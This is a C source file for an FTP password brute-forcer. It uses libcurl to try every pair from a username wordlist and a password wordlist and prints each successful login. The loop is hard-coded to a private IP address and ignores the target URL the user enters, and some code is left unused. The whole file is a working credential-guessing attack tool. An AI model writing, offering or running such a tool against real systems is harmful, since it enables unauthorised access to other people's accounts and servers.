#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>

int auth_ftp(char *username, char *password, char *url);





int main() {

char uwl_path[256] = {0};
char pwl_path[256] = {0};
char url[256] = {0};
char username[256] = {0};
char password[256] = {0};

FILE *uwl, *pwl;
printf("Etner FTP URL: ");
fgets(url, sizeof(url), stdin);
strtok(url, "\n");
printf("Enter username wordlist path: ");
fgets(uwl_path, sizeof(uwl_path), stdin);
strtok(uwl_path, "\n");
printf("Enter password wordlist path: ");
fgets(pwl_path, sizeof(pwl_path), stdin);
strtok(pwl_path, "\n");

//Bruteforce

uwl = fopen(uwl_path, "r");
if(uwl == NULL) {
	perror("Failed to open username wordlist");
	printf("\n");
	return EXIT_FAILURE;
}

pwl = fopen(pwl_path, "r");

if(pwl == NULL) {
	perror("Failed to open password wordlist");
	printf("\n");
	return EXIT_FAILURE;
}

while(fgets(username, sizeof(username), uwl) != NULL) {
	strtok(username, "\n");
	while(fgets(password, sizeof(password), pwl) != NULL) {
		strtok(password,"\n");
		auth_ftp(username, password, "ftp://192.168.1.109");
		memset(password, 0, sizeof(password));
	}
	memset(username, 0, sizeof(username));
	rewind(pwl);
}

return EXIT_SUCCESS;
}








int auth_ftp(char *username, char *password, char *url) {
	CURL *curl;
	CURLcode result;
	char fullurl[256];
	snprintf(fullurl, sizeof(fullurl), "ftp://%s", url);
	curl = curl_easy_init();
	if(curl == NULL) {
		perror("curl_easy_init");
		return EXIT_SUCCESS;
	}
	curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_USERNAME, username);
	curl_easy_setopt(curl, CURLOPT_PASSWORD, password);

	result = curl_easy_perform(curl);

	if(result == CURLE_OK) {
		printf("%s:%s, authenication success\n", username, password);
	} else {
		printf("%s:%s authenication failed\n", username, password);
	}

	curl_easy_cleanup(curl);

	return EXIT_SUCCESS;
}
